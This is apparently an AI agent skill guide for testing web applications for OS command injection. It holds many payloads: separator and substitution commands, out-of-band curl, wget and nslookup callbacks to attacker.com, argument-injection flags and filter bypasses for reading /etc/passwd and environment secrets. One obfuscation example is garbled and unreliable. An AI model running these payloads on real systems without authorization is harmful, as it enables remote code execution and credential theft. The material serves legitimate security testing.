---
name: testing-command-injection
description: OS command injection testing via shell metacharacters, argument injection, and indirect command execution. Use when parameters might be passed to system shell functions — identified by features like ping/traceroute utilities, DNS lookups, file operations, PDF/image generation with system calls, git operations, package management, email sending with custom headers, or any functionality that wraps OS commands. Covers visible and blind injection, separator and substitution variants, argument injection, environment variable abuse, and out-of-band confirmation.
---

# Command Injection Testing

Command injection occurs when user input is concatenated into OS commands executed via functions like `system()`, `exec()`, `popen()`, `Runtime.exec()`, `subprocess.call()`, or backtick evaluation. Impact is almost always RCE — the highest severity class. But finding it requires understanding WHERE commands are executed and HOW user input reaches them.

## Reference Files

- [payloads.md](./payloads.md) — Context-specific payload construction and OS-specific techniques
- [blind_techniques.md](./blind_techniques.md) — Time-based, OOB, and side-channel blind detection

## Mental Model

The developer needed to do something the programming language can't do natively: convert a file, ping a host, process an image, send an email via a system binary. They wrote something like:

```python
os.system(f"convert {user_input}.png output.jpg")
```

Your input is concatenated into a string that becomes a shell command. The shell interprets metacharacters in your input as command separators, substitutions, or redirectors.

**Key insight:** The vulnerability isn't in the web application — it's in the fact that a SHELL is parsing your input. The shell is a separate interpreter with its own syntax. Any time user input reaches a shell, command injection is possible unless the input is strictly validated or the command is constructed without shell interpretation.

**Where commands hide:**
- PDF generation (wkhtmltopdf, headless Chrome with command-line flags)
- Image processing (ImageMagick, ffmpeg, graphicsmagick)
- File conversion (LibreOffice, Pandoc)
- Network tools (ping, nslookup, dig, traceroute, whois, curl)
- Git operations (git clone, git checkout — user-supplied branch/repo names)
- Package operations (npm install, pip install — user-supplied package names)
- Email (sendmail, postfix — user-supplied headers/addresses)
- Compression (tar, zip, unzip — user-supplied filenames)
- Log processing (grep, awk, sed — user-supplied patterns)
- DNS operations (host, dig — user-supplied hostnames)
- Monitoring/health checks (wget, curl — user-supplied URLs)

## Workflow

```
1. BASELINE → 2. CONFIRMATION → 3. NEGATIVE VERDICT → 4. EXPLOITATION
   (identify shell context)  (confirm execution)  (declare not vuln)  (demonstrate RCE)

   Stop conditions checked at every step ↓
```

---

## Phase 1: Baseline Establishment

### Step 1.1: Identify Potential Shell Interaction

**Behavioral indicators that a parameter reaches a shell:**
- The feature performs an OS-level operation (file conversion, network lookup, etc.)
- Error messages contain shell/OS-level errors ("sh:", "bash:", "No such file or directory", "Permission denied")
- The response includes output that looks like command output (formatted like terminal output)
- Response time changes significantly with input length (shell parsing overhead)
- The parameter name suggests a command: `host`, `ip`, `filename`, `cmd`, `exec`, `url`, `path`

### Step 1.2: Normal Behavior Baseline

Submit the expected input. Record: status code, response content, response time (ms).

### Step 1.3: Invalid Input Baseline

Submit unexpected values. Record error handling:
- Does the error message reveal the command being run?
- Does it reveal the shell (bash, sh, cmd.exe, PowerShell)?
- Does it reveal the binary being called (convert, ping, etc.)?

### Step 1.4: Special Character Probe

Test shell metacharacters individually appended to valid input:

```
; | & ` $() ' " \ \n %0a { } < > # ~ !
```

Compare each response to BOTH baselines:
- Different from invalid input baseline → character reaches the shell and is being interpreted
- Same as invalid input baseline → character is being treated as bad input, not reaching the shell
- Error revealing shell context → strong signal

**Think about what each character means to a shell:**
- `;` — sequential command separator: `cmd1 ; cmd2`
- `|` — pipe: `cmd1 | cmd2` (cmd2 runs with cmd1's output)
- `&` — background: `cmd1 & cmd2` (both run)
- `&&` — conditional: `cmd1 && cmd2` (cmd2 runs only if cmd1 succeeds)
- `||` — conditional: `cmd1 || cmd2` (cmd2 runs only if cmd1 fails)
- `` ` `` — backtick substitution: `` cmd1 `cmd2` ``
- `$()` — command substitution: `cmd1 $(cmd2)`
- `\n` — newline: separate commands on different lines
- `>` — redirect output: `cmd1 > file` (writes to file)
- `<` — redirect input: `cmd1 < file` (reads from file)

### Step 1.5: Determine the OS

Check for indicators:
- Response headers (Server: Apache on Linux vs IIS on Windows)
- Path separators (/ vs \)
- Error messages mentioning "sh" (Unix) or "cmd" (Windows)

This determines which separators and commands to use.

### Reasoning Checkpoint
```
[PHASE-1] Baseline
[PARAMETER] {name}
[FUNCTIONALITY] {what the server does with this parameter}
[OS] {Linux/Unix / Windows / Unknown}
[SHELL-INDICATORS] {error messages, behavioral signals}
[METACHAR-RESULTS] {which characters produced different behavior}
[TIME-VARIANCE] {baseline response time ± range}
[DECISION] {Proceed — shell interaction suspected / No shell indicators — STOP}
```

---

## Phase 2: Confirmation

### Confidence Definitions

| Level | For Command Injection |
|-------|----------------------|
| HIGH | Command output visible in response, OR consistent time delay matching payload, OR OOB callback received |
| MEDIUM | Response changes with separators but cannot confirm it's command execution vs. input validation |
| LOW | No behavioral difference with any metacharacter |

### Step 2.1: Visible Output Injection

Try each separator with a command that produces identifiable output:

**Unix:**
```
; id
| id
|| id
& id
&& id
$(id)
`id`
%0aid                    (URL-encoded newline + command)
value%0a%0did            (CRLF + command)
```

**Windows:**
```
& whoami
| whoami
|| whoami
%0awhoami
```

If command output (e.g., `uid=33(www-data)` or `nt authority\system`) appears in the response → HIGH confidence. Immediate confirmation.

### Step 2.2: Time-Based Blind Detection

If no visible output, use delays:

**Unix:**
```
; sleep 5
| sleep 5
|| sleep 5
& sleep 5
`sleep 5`
$(sleep 5)
```

**Windows:**
```
& ping -n 6 127.0.0.1       (5-second delay via ping)
& timeout /t 5
| ping -n 6 127.0.0.1
```

**Confirmation protocol:**
1. Send `sleep 5` → measure response time (should be ~5s longer than baseline)
2. Send `sleep 10` → should be ~10s longer
3. Send `sleep 0` → should match baseline
4. The delay must be PROPORTIONAL to the sleep value. If all three show the same delay, it's not command injection — it's network/server latency.

**Critical:** Account for baseline response time variance. If baseline varies by ±2s, use delays of 10+ seconds to get a clear signal.

### Step 2.3: Out-of-Band Confirmation `[EXTERNAL INFRA REQUIRED]`

If neither visible output nor timing works:

**DNS-based:**
```
; nslookup UNIQUE-ID.attacker.com
$(nslookup UNIQUE-ID.attacker.com)
`nslookup UNIQUE-ID.attacker.com`
| nslookup UNIQUE-ID.attacker.com
```

**HTTP-based:**
```
; curl http://attacker.com/cmdi-confirm
$(wget http://attacker.com/cmdi-confirm)
| curl http://attacker.com/cmdi-confirm
```

A DNS query or HTTP request to your server confirms execution regardless of whether output is visible.

### Step 2.4: Argument Injection

Sometimes the input doesn't reach the shell directly but becomes an ARGUMENT to a command:

```
Application runs: convert <user_input> output.png

Not vulnerable to separators (no shell interpretation).
But vulnerable to argument injection:
  -write /tmp/evil.php     (ImageMagick write to arbitrary path)
  --output=/tmp/evil.php   (overwrite files via argument)
  -exec id                 (some commands support -exec)
```

**Common argument injection targets:**
- `git clone --upload-pack=COMMAND`
- `tar --checkpoint=1 --checkpoint-action=exec=COMMAND`
- `find . -exec COMMAND \;`
- `curl -o /tmp/evil URL` (if URL is controllable → write file)
- `ssh -o ProxyCommand=COMMAND`

### Step 2.5: Filter Bypass

If separators are filtered:

**Encoding bypasses:**
```
%0a          (newline — URL encoded)
%0d%0a       (CRLF)
%00          (null byte — may terminate string before filter)
${IFS}       (Internal Field Separator — acts as space in bash)
$'\x0a'      (bash ANSI-C quoting for newline)
```

**Obfuscation:**
```
# If "id" is blocked:
i'd'
i## Expanded skills continue here
```

**Variable substitution:**
```
# If command names are blocked:
a=i;b=d;$a$b            → runs "id"
/???/??t /???/??s??d    → /bin/cat /etc/passwd (wildcard expansion)
```

**Max confirmation attempts: 15 across different separator types and detection methods.**

### Reasoning Checkpoint
```
[PHASE-2] Confirmation
[TECHNIQUE] {visible / time-based / OOB / argument injection}
[SEPARATOR] {which worked — ; | & $() `` \n}
[RESULT] {command output / proportional delay / callback / nothing}
[CONFIDENCE] {HIGH / MEDIUM / LOW}
[DECISION] {Proceed to exploitation / Try different technique / Negative verdict}
```

---

## Negative Verdict

### True Negative Conditions
- No shell metacharacter produces behavior different from invalid input baseline
- Time-based tests show no proportional delay beyond variance
- OOB tests (if attempted) received no callback
- Argument injection tested for the identified binary
- Session confirmed valid throughout
- Both Unix AND Windows separators tested (if OS unknown)

### Structured Log
```
[VULN-NEGATIVE]
[PARAMETER] {name}
[STEPS-RUN] {separators tested, time-based, OOB, argument injection}
[SIGNAL] {nothing — all responses match baseline}
[CONCLUSION] {parameter does not reach shell execution, or is properly sanitized}
[ACTION] Parameter cleared for command injection.
```

---

## Phase 3: Exploitation

### Level 1: Identity Confirmation
```
id          (Unix — shows uid, gid, groups)
whoami      (Unix/Windows — shows username)
hostname    (both — shows server hostname)
```
Document the output. This proves RCE with the identity of the running process.

### Level 2: Environment Enumeration
```
env         (Unix — ALL environment variables)
set         (Windows — ALL environment variables)
printenv    (Unix — environment variables)
```

**STOP if environment contains credentials, API keys, database URLs, or cloud credentials.** This is Critical severity. Document and report.

### Level 3: File Read
```
cat /etc/passwd        (Unix — proves file read)
type C:\Windows\win.ini  (Windows)
```

**Stop condition:** At first confirmed command execution with output → STOP. This is RCE. Maximum severity. Generate report immediately.

### Reasoning Checkpoint
```
[PHASE-3] Exploitation
[SEPARATOR] {which separator used}
[COMMAND] {what was executed}
[OUTPUT] {response — redact sensitive data}
[USER-CONTEXT] {uid/username}
[IMPACT] {RCE as [user] on [hostname]}
[STOP-REASON] {RCE demonstrated — generating report}
```

---

## Session Re-verification

Re-send original valid input before each phase. If behavior changes, re-authenticate. Do NOT attribute session failures to command injection.

---

## Things to Do

- Think about WHAT the parameter does on the server — this tells you IF a shell is involved
- Test multiple separator types — different shells parse differently (bash vs sh vs dash vs cmd vs PowerShell)
- Use proportional timing for blind detection — sleep 5 then sleep 10 to confirm causation
- Test argument injection separately from shell injection — different vulnerability, same parameter
- Consider the OS when crafting commands — Unix and Windows have different syntax
- Use OOB confirmation when you can't see output or measure timing reliably

## Things Not to Do

- Do not run destructive commands (rm, del, format, shutdown) under any circumstances
- Do not exfiltrate data beyond what's needed for proof (one file read is enough)
- Do not install backdoors, create accounts, or modify system configuration
- Do not assume semicolons are the only separator — test ALL metacharacters
- Do not confuse application errors triggered by special characters with command execution
- Do not skip argument injection — it's a different code path that separators don't reach

---

## Cross-Skill Links

- [[sqli]] — Similar injection pattern, different interpreter
- [[ssti]] — Template injection can also achieve RCE through sandbox escape
- [[ssrf]] — SSRF to internal services may expose command injection on internal tools
- [[path-traversal]] — Command injection may enable file read without needing path traversal
- [[deserialization]] — Deserialization often achieves RCE via the same OS functions
